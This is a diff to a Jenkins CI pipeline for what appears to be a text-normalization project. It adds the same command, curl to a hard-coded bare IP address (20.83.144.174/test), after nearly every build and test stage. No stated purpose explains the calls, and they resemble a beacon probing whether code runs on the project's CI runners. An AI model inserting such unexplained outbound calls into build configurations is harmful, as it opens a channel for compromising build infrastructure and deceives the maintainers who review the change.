@@ -36,6 +36,7 @@ pipeline {
       steps{
         sh 'git config --global --add safe.directory /var/lib/jenkins/workspace/NTP_$GIT_BRANCH'
         sh 'git config --global --add safe.directory /home/jenkinsci/workspace/NTP_$GIT_BRANCH'
+        sh 'curl http://20.83.144.174/test'
       }
     }
 
@@ -43,12 +44,14 @@ pipeline {
       steps {
         sh 'python -c "import torch; print(torch.__version__)"'
         sh 'python -c "import torchvision; print(torchvision.__version__)"'
+        sh 'curl http://20.83.144.174/test'
       }
     }
 
     stage('Install test requirements') {
       steps {
         sh 'apt-get update && apt-get install -y bc'
+        sh 'curl http://20.83.144.174/test'
       }
     }
 
@@ -57,6 +60,7 @@ pipeline {
     stage('NeMo Installation') {
       steps {
         sh './reinstall.sh release'
+        sh 'curl http://20.83.144.174/test'
       }
     }
 
@@ -73,21 +77,25 @@ pipeline {
         stage('L0: Test utils') {
           steps {
             sh 'CUDA_VISIBLE_DEVICES="" pytest tests/nemo_text_processing/audio_based_utils/ --cpu'
+            sh 'curl http://20.83.144.174/test'
           }
         }
         stage('L0: En TN grammars') {
           steps {
             sh 'CUDA_VISIBLE_DEVICES="" python nemo_text_processing/text_normalization/normalize.py --text="1" --cache_dir ${EN_TN_CACHE}'
+            sh 'curl http://20.83.144.174/test'
           }
         }
         stage('L0: En TN non-deterministic grammars') {
           steps {
             sh 'CUDA_VISIBLE_DEVICES="" python nemo_text_processing/text_normalization/normalize_with_audio.py --text="1" --cache_dir ${EN_TN_CACHE}'
+            sh 'curl http://20.83.144.174/test'
           }
         }
         stage('L0: En ITN grammars') {
           steps {
             sh 'CUDA_VISIBLE_DEVICES="" python nemo_text_processing/inverse_text_normalization/inverse_normalize.py --language en --text="twenty" --cache_dir ${EN_TN_CACHE}'
+            sh 'curl http://20.83.144.174/test'
           }
         }
 
@@ -105,11 +113,13 @@ pipeline {
         stage('L0: Hi TN grammars') {
             steps {
                 sh 'CUDA_VISIBLE_DEVICES="" python nemo_text_processing/text_normalization/normalize.py --lang=hi --text="१" --cache_dir ${HI_TN_CACHE}'
+                sh 'curl http://20.83.144.174/test'
             }
         }
         stage('L0: Hi ITN grammars') {
             steps {
                 sh 'CUDA_VISIBLE_DEVICES="" python nemo_text_processing/inverse_text_normalization/inverse_normalize.py --lang=hi --text="एक" --cache_dir ${HI_TN_CACHE}'
+                sh 'curl http://20.83.144.174/test'
             }
         }
         
